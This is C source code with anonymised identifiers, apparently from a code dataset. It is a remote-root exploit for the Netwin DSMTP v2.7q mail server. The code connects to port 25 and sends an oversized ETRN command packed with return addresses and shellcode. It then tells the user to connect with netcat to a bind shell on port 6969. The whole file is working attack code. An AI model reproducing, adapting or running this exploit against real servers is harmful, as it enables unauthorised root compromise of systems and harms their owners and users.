
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int servaddr ;
typedef int ovf ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (struct sockaddr_in*,int) ;
 scalar_t__ FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int ,char*,...) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (int) ;
 int FUNC_7 (unsigned char*,char*,int) ;
 int FUNC_8 (unsigned char*,int ,int) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (char*) ;
 int FUNC_11 (int,char*,int) ;
 int FUNC_12 (char*,int *) ;
 unsigned char* VAR_7 ;
 int FUNC_13 (int) ;
 int FUNC_14 (int ,int ,int ) ;
 int VAR_8 ;
 int FUNC_15 (unsigned char*,char*) ;
 int FUNC_16 (unsigned char*) ;
 int FUNC_17 (int,...) ;

int
FUNC_18(int VAR_9, char *VAR_10[])
{

        int VAR_11, VAR_12;
        int VAR_13, VAR_14;
        unsigned char VAR_15[860];
        char VAR_16[200];
        int VAR_17 = 0;
        struct sockaddr_in VAR_18;
        if (VAR_9 < 2 ){
        FUNC_4(VAR_8,"%s <host> [offset]\n",VAR_10[0]);
        FUNC_3(0);
        }
      if(VAR_10[2])
         VAR_17=FUNC_0(VAR_10[2]);
FUNC_10("Netwin DSMTP v2.7q remote-root exploit by noir\n");
        if( (VAR_11 = FUNC_14(VAR_0, VAR_5, VAR_2)) < 0){
        FUNC_9("socket");
        FUNC_3(-1);
        }

        FUNC_1(&VAR_18, sizeof(VAR_18));
        VAR_18.sin_family = VAR_0;
        VAR_18.sin_port = FUNC_6(25);
        if(!FUNC_12(VAR_10[1], &VAR_18.sin_addr)){
        FUNC_5("gethostbyname");
        FUNC_3(-1); }

        if(FUNC_2(VAR_11, (struct sockaddr *) &VAR_18, sizeof(VAR_18)) < 0 ){
        FUNC_9("connect");
        FUNC_3(-1);
        }

        VAR_12 = FUNC_11(VAR_11, VAR_16, 1024);
        FUNC_17(VAR_6, VAR_16, VAR_12);
        FUNC_13(2);
        FUNC_4(VAR_8, "check for portshell 6969/tcp when done\n");

        FUNC_8(VAR_15, VAR_3, sizeof(VAR_15));
        for( VAR_13 = VAR_1; VAR_13 < 300; VAR_13+=4)
        *(long *) &VAR_15[VAR_13] = VAR_4 + VAR_17;
        for( VAR_13 = 650, VAR_14 = 0; VAR_14 < FUNC_16(VAR_7) ;VAR_13++, VAR_14++)
        VAR_15[VAR_13] = VAR_7[VAR_14];
        FUNC_7(VAR_15, "ETRN ", 5);
        FUNC_15(VAR_15+858,"\r\n\0");
        FUNC_17(VAR_11, VAR_15, FUNC_16(VAR_15));
        FUNC_4(VAR_8,"done!\n$ nc %s 6969\n", VAR_10[1]);
        return 1;
}
